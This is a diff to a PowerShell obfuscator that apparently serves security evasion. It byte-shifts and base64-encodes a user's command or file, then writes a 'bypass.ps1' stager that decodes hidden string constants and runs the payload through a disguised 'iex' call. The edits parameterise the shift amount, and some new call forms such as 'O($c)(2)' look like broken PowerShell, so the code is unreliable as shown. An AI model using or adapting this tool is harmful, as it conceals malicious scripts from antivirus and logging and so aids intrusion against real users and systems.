@@ -1,11 +1,11 @@
 param([string] $c,[string] $f)
 
-function encrypt($v){
+function encrypt([Byte[]]$v,[int]$n){
     $y = 9
     while($y -gt 6){
         [Byte[]]$t = $v.clone()
         for ($x = 0; $x -lt $v.Count; $x++) {
-            $t[$v.Count-$x-1] = $v[$x] - 3
+            $t[$v.Count-$x-1] = $v[$x] - $n
         }
         $v = $t
         $y = $y - 1
@@ -21,23 +21,23 @@ $text2="');[Byte[]]`$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGt
 "[Byte[]]`$h = [System.Convert]::FromBase64String('W1xjWVhlXFZk');"+
 "[Byte[]]`$i = [System.Convert]::FromBase64String('aVxbYG1maUdeZkNuazxKRyVeZWBaWGlLJWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=');"+
 "[Byte[]]`$j = [System.Convert]::FromBase64String('aVxbYG1maUdua1w=');"+
-"function O (`$v){"+
+"function O ([Byte[]]`$v,[int]`$n){"+
     "[Byte[]]`$t = `$v.clone();"+
     "for (`$x = 0; `$x -lt `$v.Count; `$x++) {"+
-        "`$t[`$v.Count-`$x-1] = `$v[`$x] + 3;"+
+        "`$t[`$v.Count-`$x-1] = `$v[`$x] + `$n;"+
     "}"+
     "return `$t;"+
 "}"+
-"`$y = 9;"+
-"while(`$y -gt 6){"+
-    "`$c = O(`$c);"+
-    "`$d = O(`$d);"+
-    "`$e = O(`$e);"+
-    "`$f = O(`$f);"+
-    "`$g = O(`$g);"+
-    "`$h = O(`$h);"+
-    "`$i = O(`$i);"+
-    "`$j = O(`$j);"+
+"`$y = 3;"+
+"while(`$y -gt 0){"+
+    "`$c = O(`$c)(2);"+
+    "`$d = O(`$d)(3);"+
+    "`$e = O(`$e)(3);"+
+    "`$f = O(`$f)(3);"+
+    "`$g = O(`$g)(3);"+
+    "`$h = O(`$h)(3);"+
+    "`$i = O(`$i)(3);"+
+    "`$j = O(`$j)(3);"+
     "`$y = `$y - 1;"+
 "}"+
 "`$cc = [System.Text.Encoding]::ASCII.GetString(`$c);"+
@@ -46,7 +46,7 @@ $text2="');[Byte[]]`$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGt
 "i``ex(`$cc);"
 
 If(![String]::IsNullOrEmpty($c) -and [String]::IsNullOrEmpty($f)){
-    $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($c))
+    $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($c))(2)
     write-output ($text1 + [Convert]::ToBase64String($result) + $text2) | out-file -filepath bypass.ps1
     Write-Host("[+] obfuscation result has been saved in bypass.ps1")
 }elseif(![String]::IsNullOrEmpty($f) -and [String]::IsNullOrEmpty($c)){
@@ -55,7 +55,7 @@ If(![String]::IsNullOrEmpty($c) -and [String]::IsNullOrEmpty($f)){
     while( -not $stream.EndOfStream) {
         $file = $file + $stream.ReadLine() + "`n"
     }
-    $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($file))
+    $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($file))(2) 
     write-output ($text1 + [Convert]::ToBase64String($result) + $text2) | out-file -filepath bypass.ps1
     Write-Host("[+] obfuscation result has been saved in bypass.ps1")
 }else{
